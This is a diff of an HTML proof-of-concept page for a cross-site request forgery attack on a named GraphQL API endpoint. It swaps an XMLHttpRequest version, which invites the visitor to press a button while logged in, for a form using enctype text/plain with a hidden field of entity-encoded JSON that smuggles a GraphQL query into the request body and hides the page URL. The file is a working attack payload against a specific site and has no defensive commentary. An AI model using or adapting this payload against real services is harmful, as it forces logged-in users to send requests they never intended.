@@ -1,22 +1,9 @@
 <html>
   <body>
-   
-  I hope you're logged in. Press the button :)
-  <br>
-  <br>
-    
-  <input type="submit" value="Submit request" onclick="submit()">
-
-  <script type="text/javascript">
-    history.pushState('', '', '/')
-    function submit() {
-      var xmlhttp = new XMLHttpRequest();
-      var url = "https://ap.app.helloanew.com/api/graphql";
-      xmlhttp.open("POST", url);
-      xmlhttp.setRequestHeader("Content-Type", "text/plain");
-      var payload = JSON.stringify({"operationName":"getMyTickets","variables":{},"query":"query getMyTickets {\n  myTickets {\n    id\n    unique_id\n    status_id\n    status_updated_at\n    user_description\n    created_at\n    service_group_id\n    service_group_path\n    repair_price_created_at\n    repair_price_expires_at\n    __typename\n  }\n}\n"});
-      xmlhttp.send(payload);
-    };
-  </script>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://ap.app.helloanew.com/api/graphql" method="POST" enctype="text/plain">
+      <input type="hidden" name="&#x7b;&#x22;&#x76;&#x61;&#x72;&#x69;&#x61;&#x62;&#x6c;&#x65;&#x73;&#x22;&#x3a;&#x20;&#x7b;&#x7d;&#x2c;&#x20;&#x22;&#x71;&#x75;&#x65;&#x72;&#x79;&#x22;&#x3a;&#x20;&#x22;&#x71;&#x75;&#x65;&#x72;&#x79;&#x20;&#x67;&#x65;&#x74;&#x4d;&#x79;&#x54;&#x69;&#x63;&#x6b;&#x65;&#x74;&#x73;&#x20;&#x7b;&#x5c;&#x6e;&#x20;&#x20;&#x6d;&#x79;&#x54;&#x69;&#x63;&#x6b;&#x65;&#x74;&#x73;&#x20;&#x7b;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x69;&#x64;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x75;&#x6e;&#x69;&#x71;&#x75;&#x65;&#x5f;&#x69;&#x64;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x61;&#x74;&#x75;&#x73;&#x5f;&#x69;&#x64;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x61;&#x74;&#x75;&#x73;&#x5f;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x64;&#x5f;&#x61;&#x74;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x75;&#x73;&#x65;&#x72;&#x5f;&#x64;&#x65;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x64;&#x5f;&#x61;&#x74;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x5f;&#x67;&#x72;&#x6f;&#x75;&#x70;&#x5f;&#x69;&#x64;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x5f;&#x67;&#x72;&#x6f;&#x75;&#x70;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x70;&#x61;&#x69;&#x72;&#x5f;&#x70;&#x72;&#x69;&#x63;&#x65;&#x5f;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x64;&#x5f;&#x61;&#x74;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x70;&#x61;&#x69;&#x72;&#x5f;&#x70;&#x72;&#x69;&#x63;&#x65;&#x5f;&#x65;&#x78;&#x70;&#x69;&#x72;&#x65;&#x73;&#x5f;&#x61;&#x74;&#x5c;&#x6e;&#x20;&#x20;&#x20;&#x20;&#x5f;&#x5f;&#x74;&#x79;&#x70;&#x65;&#x6e;&#x61;&#x6d;&#x65;&#x5c;&#x6e;&#x20;&#x20;&#x7d;&#x5c;&#x6e;&#x7d;&#x5c;&#x6e;&#x22;&#x2c;&#x20;&#x22;&#x6f;&#x70;&#x65;&#x72;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x4e;&#x61;&#x6d;&#x65;&#x22;&#x3a;&#x20;&#x22;&#x67;&#x65;&#x74;&#x4d;&#x79;&#x54;&#x69;&#x63;&#x6b;&#x65;&#x74;&#x73;&#x22;&#x2c;&#x20;&#x22;&#x65;&#x73;&#x63;&#x61;&#x70;&#x65;&#x22;&#x3a;&#x20;&#x22;" value="&#x22;&#x7d;" />
+      <input type="submit" value="Submit request" />
+    </form>
   </body>
 </html>
